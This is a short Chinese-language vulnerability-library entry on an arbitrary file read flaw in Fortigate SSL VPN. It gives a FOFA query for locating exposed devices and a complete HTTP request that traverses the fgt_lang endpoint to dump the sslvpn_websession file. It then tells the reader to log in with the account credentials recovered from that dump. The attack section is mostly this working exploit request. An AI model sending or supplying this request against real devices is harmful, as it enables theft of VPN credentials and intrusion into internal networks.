---
fofa: "app="
source: "wy876 漏洞文库"
---

# Fortigate SSL VPN fgt_lang存在任意文件读取漏洞

# 一、漏洞简介
飞塔防火墙设备的专用名词，Fortinet是飞塔的品牌，而FortiGate 是指飞塔硬件。Fortinet的屡获殊荣的FortiGate系列，是采用ASIC加速的UTM解决方案，可以有效地防御网络层和内容层的攻击。Fortinet将其SSL VPN产品线称为Fortigate SSL VPN,主要应用于最终用户以及中型企业。目前互联网上这些服务器的数量已超过48万台,主要集中在亚洲及欧洲区域。FortinetSSL VPN系统存在任意文件读取漏洞，攻击者通过漏洞可以通过VPN进入内网，导致内网失陷。

# 二、影响版本
+ Fortigate SSL VPN

# 三、资产测绘
+ fofa`app="FORTINET-SSLVPN"`
+ 特征


# 四、漏洞复现
```java
GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive
```


<font style="color:rgb(34, 34, 34);">根据账号密码登录即可</font>


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ewnsxk842voyxx9o>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
